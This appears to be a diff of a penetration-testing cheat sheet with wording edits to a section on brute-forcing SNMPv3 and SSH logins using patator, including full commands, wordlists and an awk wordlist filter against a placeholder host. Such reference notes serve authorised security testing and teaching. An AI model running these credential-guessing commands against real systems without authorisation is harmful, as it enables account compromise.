@@ -434,8 +434,8 @@ patator snmp_login host=10.10.10.10 version=3 user=FILE0 0=users.txt -x ignore:m
 ```
 patator snmp_login host=10.10.10.10 version=3 user=<user> auth_proto=md5 auth_key=FILE0 0=passwords.txt -x ignore:mesg='Wrong SNMP PDU digest' -x ignore:mesg='SNMPv3 requires passwords to be at least 8 characters long'
 ```
-> Patator doesn't take into consideration that `SNMPv3` requires passwords to be at least 8 characters. It tries every password no matter the length.
-To fix that, we must select words that have at least 8 characters :
+> Patator doesn't take into consideration that `SNMPv3` requires passwords to have at least 8 characters. It tries every password no matter the length.
+To fix that, we must select words that have at least 8 characters in our wordlist :
 ```
 awk '{ for (i=1; i<=NF; i++) if (length($i) >= 8) print $i }' <passwords.txt> > long_words.txt
 ```
@@ -443,8 +443,7 @@ After that we can execute `patator` with the following command :
 ```
 patator snmp_login host=10.10.10.10 version=3 user=<user> auth_proto=md5 auth_key=FILE0 0=long_words.txt -x ignore:mesg='Wrong SNMP PDU digest'
 ```
-> Refer to the help menu `patator snmp_login -h` to learn more about this attack
-
+> Refer to the help menu `patator snmp_login -h` for more information
 ### SSH
 ```
 patator ssh_login host=10.10.10.10 user='<user>' password=FILE0 0='<passwords.txt>' -x ignore:mesg='Authentication failed.'
